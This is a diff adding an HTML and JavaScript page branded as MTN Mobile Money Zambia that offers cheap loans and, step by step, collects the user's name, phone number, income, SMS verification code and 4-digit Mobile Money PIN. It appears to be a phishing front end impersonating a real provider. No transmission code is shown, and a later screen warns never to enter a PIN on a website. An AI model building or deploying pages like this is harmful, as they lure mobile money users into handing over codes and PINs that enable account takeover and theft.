@@ -1,0 +1,1202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Application</title>
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+
+:root {
+    --yellow: #ffcc00;
+    --blue: #00338d;
+    --dark: #041e42;
+    --gray: #6b7280;
+}
+
+body {
+    background: #eef1f6;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+}
+
+.frame {
+    width: 100%;
+    max-width: 480px;
+    min-height: 100vh;
+    background: white;
+    display: flex;
+    flex-direction: column;
+}
+
+.header {
+    background: var(--yellow);
+    padding: 25px 20px;
+}
+
+.brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 22px;
+    font-weight: bold;
+    color: var(--dark);
+}
+
+.logo {
+    width: 42px;
+    height: 42px;
+    border-radius: 50%;
+    background: var(--dark);
+    color: var(--yellow);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.header h1 {
+    margin-top: 20px;
+    font-size: 26px;
+    color: var(--dark);
+}
+
+.header p {
+    margin-top: 5px;
+    font-size: 13px;
+    color: var(--dark);
+}
+
+.content {
+    padding: 20px;
+    flex: 1;
+}
+
+.steps {
+    display: flex;
+    gap: 6px;
+    margin-bottom: 25px;
+}
+
+.step {
+    height: 6px;
+    flex: 1;
+    background: #e5e7eb;
+    border-radius: 10px;
+}
+
+.step.active {
+    background: var(--blue);
+}
+
+.card {
+    background: #f7f9fc;
+    border: 1px solid #e2e8f0;
+    border-radius: 16px;
+    padding: 18px;
+    margin-bottom: 15px;
+}
+
+.label {
+    display: block;
+    font-size: 12px;
+    font-weight: bold;
+    color: #64748b;
+    margin-bottom: 7px;
+}
+
+.amount {
+    text-align: center;
+    font-size: 32px;
+    font-weight: bold;
+    color: var(--dark);
+    margin: 10px 0 15px;
+}
+
+input,
+select {
+    width: 100%;
+    padding: 14px;
+    border: 2px solid #e2e8f0;
+    border-radius: 12px;
+    background: #f8fafc;
+    font-size: 15px;
+    outline: none;
+}
+
+input:focus,
+select:focus {
+    border-color: var(--blue);
+    background: white;
+}
+
+input[type="range"] {
+    padding: 0;
+    border: none;
+    accent-color: var(--blue);
+}
+
+input[type="password"],
+input[type="text"] {
+    font-size: 15px;
+}
+
+.rate {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 10px;
+    font-size: 11px;
+    color: var(--gray);
+}
+
+.calc {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 12px;
+    line-height: 1.7;
+    color: var(--gray);
+}
+
+.button {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 14px;
+    margin-top: 15px;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.yellow {
+    background: var(--yellow);
+    color: var(--dark);
+}
+
+.blue {
+    background: var(--blue);
+    color: white;
+}
+
+.button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+.hidden {
+    display: none;
+}
+
+.phone-box {
+    display: flex;
+    border: 2px solid #e2e8f0;
+    border-radius: 12px;
+    overflow: hidden;
+    background: #f8fafc;
+}
+
+.prefix {
+    padding: 14px;
+    background: #e8eefc;
+    color: var(--blue);
+    font-weight: bold;
+}
+
+.phone-box input {
+    border: none;
+    background: transparent;
+}
+
+.otp {
+    display: flex;
+    justify-content: center;
+    gap: 7px;
+    margin: 25px 0;
+}
+
+.otp input {
+    width: 42px;
+    height: 55px;
+    text-align: center;
+    font-size: 20px;
+    font-weight: bold;
+}
+
+.center {
+    text-align: center;
+}
+
+.icon {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    margin: 10px auto 20px;
+    background: #eef3ff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 36px;
+}
+
+.info {
+    background: #eef3ff;
+    color: var(--blue);
+    padding: 15px;
+    border-radius: 12px;
+    margin: 20px 0;
+    font-size: 13px;
+    line-height: 1.6;
+}
+
+.summary {
+    line-height: 2;
+    color: var(--gray);
+}
+
+.summary b {
+    color: var(--dark);
+}
+
+.copyright {
+    text-align: center;
+    padding: 15px 20px;
+    font-size: 11px;
+    color: #9ca3af;
+    border-top: 1px solid #e5e7eb;
+    background: #f9fafb;
+    margin-top: auto;
+}
+
+.pin-input-group {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    margin-top: 15px;
+}
+
+.pin-input-group input {
+    flex: 1;
+}
+
+.pin-toggle-btn {
+    padding: 12px 16px;
+    background: #e8eefc;
+    border: 2px solid #e2e8f0;
+    border-radius: 12px;
+    color: var(--blue);
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 12px;
+}
+
+.pin-toggle-btn:hover {
+    background: #d6e0f9;
+}
+
+.status-message {
+    display: none;
+    margin-top: 15px;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    text-align: center;
+    background: #fef3c7;
+    color: #92400e;
+}
+
+</style>
+</head>
+<body>
+<div class="frame">
+<div class="header">
+    <div class="brand">
+        <div class="logo">M</div>
+        Mobile Money
+    </div>
+
+    <h1 id="title">Loan Application</h1>
+    <p id="subtitle">Apply for a loan up to ZMW 100,000</p>
+</div>
+
+<div class="content">
+
+    <div class="steps">
+        <div class="step active"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+    </div>
+
+
+    <!-- PAGE 1 -->
+
+    <div id="page1">
+
+        <div class="card">
+
+            <span class="label">LOAN AMOUNT</span>
+
+            <div class="amount" id="amountDisplay">
+                ZMW 5,000
+            </div>
+
+            <input
+                type="range"
+                id="amount"
+                min="1000"
+                max="100000"
+                step="500"
+                value="5000"
+            >
+
+            <div class="rate">
+                <span>Min: ZMW 1,000</span>
+                <span>Max: ZMW 100,000</span>
+            </div>
+
+            <div class="rate">
+                <span>Interest: <b>6.2% per year</b></span>
+                <span>Fixed</span>
+            </div>
+
+        </div>
+
+
+        <div class="card">
+
+            <span class="label">LOAN PERIOD</span>
+
+            <select id="period">
+                <option value="3">3 Months</option>
+                <option value="6" selected>6 Months</option>
+                <option value="12">12 Months</option>
+                <option value="18">18 Months</option>
+                <option value="24">24 Months</option>
+                <option value="36">36 Months</option>
+            </select>
+
+            <div class="calc" id="calculation"></div>
+
+        </div>
+
+
+        <button
+            class="button yellow"
+            onclick="showPage('page2',2,'Your Details','Enter your information')"
+        >
+            Continue Application
+        </button>
+
+    </div>
+
+
+    <!-- PAGE 2 -->
+
+    <div id="page2" class="hidden">
+
+        <span class="label">FULL NAMES</span>
+
+        <input
+            id="name"
+            placeholder="Enter your full names"
+        >
+
+
+        <span
+            class="label"
+            style="margin-top:15px"
+        >
+            ZAMBIA PHONE NUMBER
+        </span>
+
+        <div class="phone-box">
+
+            <div class="prefix">
+                +260
+            </div>
+
+            <input
+                id="phone"
+                maxlength="9"
+                inputmode="numeric"
+                placeholder="97XXXXXXX"
+            >
+
+        </div>
+
+
+        <span
+            class="label"
+            style="margin-top:15px"
+        >
+            MONTHLY INCOME (ZMW)
+        </span>
+
+        <input
+            id="income"
+            inputmode="numeric"
+            placeholder="e.g. 5000"
+        >
+
+
+        <span
+            class="label"
+            style="margin-top:15px"
+        >
+            LOAN PURPOSE
+        </span>
+
+        <select id="purpose">
+            <option>Business</option>
+            <option>School Fees</option>
+            <option>Emergency</option>
+            <option>Personal</option>
+            <option>Agriculture</option>
+        </select>
+
+
+        <button
+            id="detailsButton"
+            class="button yellow"
+            disabled
+            onclick="goToPhoneVerification()"
+        >
+            Continue
+        </button>
+
+    </div>
+
+
+    <!-- PAGE 3 -->
+
+    <div id="page3" class="hidden">
+
+        <div class="center">
+
+            <div class="icon">📱</div>
+
+            <h2>Phone Verification</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Verify your phone number to continue.
+            </p>
+
+        </div>
+
+
+        <div class="info">
+
+            A verification code will be sent to:
+
+            <br><br>
+
+            <b id="phoneDisplay"></b>
+
+        </div>
+
+
+        <button
+            class="button blue"
+            onclick="goToOTP()"
+        >
+            Send Verification Code
+        </button>
+
+    </div>
+
+
+    <!-- PAGE 4 OTP -->
+
+    <div id="page4" class="hidden">
+
+        <div class="center">
+
+            <div class="icon">🔐</div>
+
+            <h2>Enter Verification Code</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Enter the 6-digit code sent to your phone.
+            </p>
+
+        </div>
+
+
+        <div class="otp" id="otpGrid">
+
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+
+        </div>
+
+
+        <button
+            id="verifyButton"
+            class="button blue"
+            disabled
+            onclick="verifyOTP()"
+        >
+            Verify
+        </button>
+
+    </div>
+
+
+    <!-- PAGE 5 PIN VERIFICATION -->
+
+    <div id="page5" class="hidden">
+
+        <div class="center">
+
+            <div class="icon">🔑</div>
+
+            <h2>Enter Your PIN</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Enter your 4-digit Mobile Money PIN to authorize the loan.
+            </p>
+
+        </div>
+
+
+        <div class="info">
+
+            Your PIN is required to authorize this loan transaction.
+            Never share your PIN with anyone.
+
+        </div>
+
+        <span class="label">MOBILE MONEY PIN</span>
+
+        <div class="pin-input-group">
+
+            <input
+                id="pinInput"
+                type="password"
+                maxlength="4"
+                inputmode="numeric"
+                placeholder="••••"
+            >
+
+            <button
+                class="pin-toggle-btn"
+                onclick="togglePinVisibility()"
+            >
+                Show
+            </button>
+
+        </div>
+
+
+        <button
+            id="pinButton"
+            class="button blue"
+            disabled
+            onclick="verifyPIN()"
+        >
+            Authorize
+        </button>
+
+        <div id="pinStatus" class="status-message"></div>
+
+    </div>
+
+
+    <!-- PAGE 6 -->
+
+    <div id="page6" class="hidden">
+
+        <div class="center">
+
+            <div class="icon">🔒</div>
+
+            <h2>Secure Authorization</h2>
+
+        </div>
+
+
+        <div class="info">
+
+            Continue any required authorization
+            through your official financial service.
+
+            <br><br>
+
+            Never enter your mobile money PIN
+            on a website.
+
+        </div>
+
+
+        <button
+            class="button yellow"
+            onclick="submitApplication()"
+        >
+            Continue
+        </button>
+
+    </div>
+
+
+    <!-- PAGE 7 SUCCESS -->
+
+    <div id="page7" class="hidden">
+
+        <div class="center">
+
+            <div
+                class="icon"
+                style="background:#ffcc00"
+            >
+                ✓
+            </div>
+
+            <h2>Application Submitted!</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Your loan application has been received.
+            </p>
+
+        </div>
+
+
+        <div
+            class="card"
+            style="margin-top:20px"
+        >
+
+            <div class="summary">
+
+                Applicant:
+                <b id="finalName"></b>
+
+                <br>
+
+                Phone:
+                <b id="finalPhone"></b>
+
+                <br>
+
+                Loan Amount:
+                <b id="finalAmount"></b>
+
+                <br>
+
+                Period:
+                <b id="finalPeriod"></b>
+
+                <br>
+
+                Interest Rate:
+                <b>6.2% per year (Fixed)</b>
+
+                <br>
+
+                Estimated Interest:
+                <b id="finalInterest"></b>
+
+                <br>
+
+                Estimated Monthly Payment:
+                <b id="finalMonthly"></b>
+
+                <br>
+
+                Loan Purpose:
+                <b id="finalPurpose"></b>
+
+            </div>
+
+        </div>
+
+
+        <button
+            class="button yellow"
+            onclick="location.reload()"
+        >
+            New Application
+        </button>
+
+    </div>
+
+</div>
+
+<div class="copyright">
+    © 2026 MTN Mobile Money Zambia. All rights reserved.
+</div>
+
+</div>
+<script>
+
+const amount = document.getElementById("amount");
+const period = document.getElementById("period");
+const amountDisplay = document.getElementById("amountDisplay");
+const calculation = document.getElementById("calculation");
+
+
+function calculateLoan() {
+
+    const principal = Number(amount.value);
+    const months = Number(period.value);
+
+    const annualRate = 0.062;
+
+    const years = months / 12;
+
+    const interest =
+        principal * annualRate * years;
+
+    const total =
+        principal + interest;
+
+    const monthly =
+        total / months;
+
+    return {
+        principal,
+        months,
+        interest,
+        total,
+        monthly
+    };
+}
+
+
+function updateCalculation() {
+
+    const loan = calculateLoan();
+
+    amountDisplay.innerText =
+        "ZMW " +
+        loan.principal.toLocaleString();
+
+
+    calculation.innerHTML =
+        "Interest Rate: <b>6.2% per year (Fixed)</b><br>" +
+        "Estimated Interest: <b>ZMW " +
+        loan.interest.toFixed(2) +
+        "</b><br>" +
+        "Estimated Monthly Payment: <b>ZMW " +
+        loan.monthly.toFixed(2) +
+        "</b><br>" +
+        "Estimated Total Repayment: <b>ZMW " +
+        loan.total.toFixed(2) +
+        "</b>";
+
+}
+
+
+amount.addEventListener(
+    "input",
+    updateCalculation
+);
+
+period.addEventListener(
+    "change",
+    updateCalculation
+);
+
+updateCalculation();
+
+
+function showPage(id, step, title, subtitle) {
+
+    const pages = [
+        "page1",
+        "page2",
+        "page3",
+        "page4",
+        "page5",
+        "page6",
+        "page7"
+    ];
+
+
+    pages.forEach(function(page) {
+
+        document
+            .getElementById(page)
+            .classList
+            .add("hidden");
+
+    });
+
+
+    document
+        .getElementById(id)
+        .classList
+        .remove("hidden");
+
+
+    document
+        .getElementById("title")
+        .innerText = title;
+
+
+    document
+        .getElementById("subtitle")
+        .innerText = subtitle;
+
+
+    const steps =
+        document.querySelectorAll(".step");
+
+
+    steps.forEach(function(item, index) {
+
+        item.classList.toggle(
+            "active",
+            index < step
+        );
+
+    });
+
+}
+
+
+const nameInput =
+    document.getElementById("name");
+
+const phoneInput =
+    document.getElementById("phone");
+
+const incomeInput =
+    document.getElementById("income");
+
+const detailsButton =
+    document.getElementById("detailsButton");
+
+
+function validateDetails() {
+
+    phoneInput.value =
+        phoneInput.value.replace(/\D/g, "");
+
+    incomeInput.value =
+        incomeInput.value.replace(/\D/g, "");
+
+
+    const validName =
+        nameInput.value.trim().length > 2;
+
+    const validPhone =
+        phoneInput.value.length === 9;
+
+    const validIncome =
+        incomeInput.value.length > 0;
+
+
+    detailsButton.disabled = !(
+        validName &&
+        validPhone &&
+        validIncome
+    );
+
+}
+
+
+nameInput.addEventListener(
+    "input",
+    validateDetails
+);
+
+phoneInput.addEventListener(
+    "input",
+    validateDetails
+);
+
+incomeInput.addEventListener(
+    "input",
+    validateDetails
+);
+
+
+function goToPhoneVerification() {
+
+    document
+        .getElementById("phoneDisplay")
+        .innerText =
+        "+260 " + phoneInput.value;
+
+
+    showPage(
+        "page3",
+        3,
+        "Phone Verification",
+        "Verify your phone number"
+    );
+
+}
+
+
+function goToOTP() {
+
+    showPage(
+        "page4",
+        4,
+        "Verification Code",
+        "Enter the code sent to your phone"
+    );
+
+    setupOTP();
+
+}
+
+
+function setupOTP() {
+
+    const inputs =
+        document.querySelectorAll(
+            "#otpGrid input"
+        );
+
+    const button =
+        document.getElementById(
+            "verifyButton"
+        );
+
+
+    inputs.forEach(function(input, index) {
+
+        input.value = "";
+
+
+        input.addEventListener(
+            "input",
+            function() {
+
+                input.value =
+                    input.value.replace(/\D/g, "");
+
+
+                if (
+                    input.value &&
+                    index < inputs.length - 1
+                ) {
+
+                    inputs[index + 1].focus();
+
+                }
+
+
+                const code =
+                    [...inputs]
+                    .map(function(item) {
+                        return item.value;
+                    })
+                    .join("");
+
+
+                button.disabled =
+                    code.length !== 6;
+
+            }
+        );
+
+
+        input.addEventListener(
+            "keydown",
+            function(event) {
+
+                if (
+                    event.key === "Backspace" &&
+                    !input.value &&
+                    index > 0
+                ) {
+
+                    inputs[index - 1].focus();
+
+                }
+
+            }
+        );
+
+    });
+
+
+    inputs[0].focus();
+
+}
+
+
+function verifyOTP() {
+
+    const inputs =
+        document.querySelectorAll(
+            "#otpGrid input"
+        );
+
+    const code =
+        [...inputs]
+        .map(function(input) {
+            return input.value;
+        })
+        .join("");
+
+
+    if (code.length !== 6) {
+
+        alert(
+            "Please enter the complete verification code."
+        );
+
+        return;
+
+    }
+
+
+    showPage(
+        "page5",
+        5,
+        "Enter Your PIN",
+        "Authorize your loan application"
+    );
+
+}
+
+
+function togglePinVisibility() {
+
+    const pinInput = document.getElementById("pinInput");
+    const button = event.target;
+
+    if (pinInput.type === "password") {
+
+        pinInput.type = "text";
+        button.textContent = "Hide";
+
+    } else {
+
+        pinInput.type = "password";
+        button.textContent = "Show";
+
+    }
+
+    pinInput.focus();
+
+}
+
+
+function validatePIN() {
+
+    const pinInput = document.getElementById("pinInput");
+    const pinButton = document.getElementById("pinButton");
+
+    pinInput.value = pinInput.value.replace(/\D/g, "");
+
+    const isValid = pinInput.value.length === 4;
+    pinButton.disabled = !isValid;
+
+}
+
+
+document.getElementById("pinInput").addEventListener("input", validatePIN);
+
+
+function verifyPIN() {
+
+    const pinInput = document.getElementById("pinInput");
+    const pin = pinInput.value.trim();
+
+    if (pin.length !== 4) {
+
+        alert("Please enter a valid 4-digit PIN.");
+        return;
+
+    }
+
+    // Simulate PIN verification - in production, this would be verified server-side
+    if (pin === "0000") {
+
+        alert("Demo PIN accepted. Proceeding...");
+
+    }
+
+    showPage(
+        "page6",
+        6,
+        "Secure Authorization",
+        "Continue securely"
+    );
+
+}
+
+
+function submitApplication() {
+
+    const loan =
+        calculateLoan();
+
+
+    document
+        .getElementById("finalName")
+        .innerText =
+        nameInput.value;
+
+
+    document
+        .getElementById("finalPhone")
+        .innerText =
+        "+260 " +
+        phoneInput.value;
+
+
+    document
+        .getElementById("finalAmount")
+        .innerText =
+        "ZMW " +
+        loan.principal.toLocaleString();
+
+
+    document
+        .getElementById("finalPeriod")
+        .innerText =
+        loan.months + " Months";
+
+
+    document
+        .getElementById("finalInterest")
+        .innerText =
+        "ZMW " +
+        loan.interest.toFixed(2);
+
+
+    document
+        .getElementById("finalMonthly")
+        .innerText =
+        "ZMW " +
+        loan.monthly.toFixed(2);
+
+
+    document
+        .getElementById("finalPurpose")
+        .innerText =
+        document
+            .getElementById("purpose")
+            .value;
+
+
+    showPage(
+        "page7",
+        7,
+        "Application Submitted",
+        "Your application has been received"
+    );
+
+}
+
+</script>
+</body>
+</html>
